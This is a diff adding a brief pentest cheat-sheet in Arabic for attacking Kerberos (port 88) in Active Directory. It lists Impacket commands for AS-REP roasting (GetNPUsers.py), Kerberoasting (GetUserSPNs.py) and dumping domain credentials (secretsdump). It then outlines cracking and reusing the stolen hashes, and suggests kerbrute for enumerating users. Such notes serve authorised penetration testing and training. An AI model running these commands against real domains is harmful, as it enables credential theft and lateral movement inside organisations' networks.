@@ -1,0 +1,14 @@
+# Kerberos (88)
+أوامر: 
+- GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <dc_ip> -no-pass
+- GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <dc_ip> -request
+- impacket-secretsdump <domain>/<user>:<pass>@<dc_ip>
+
+وصول: 
+- AS-REP Roast
+- Kerberoasting
+- تسريب Hashes ثم Crack → إعادة الاستخدام
+
+ملاحظات: 
+- Kerberos يعتمد دومين صحيح
+- جرّب kerbrute للتعداد
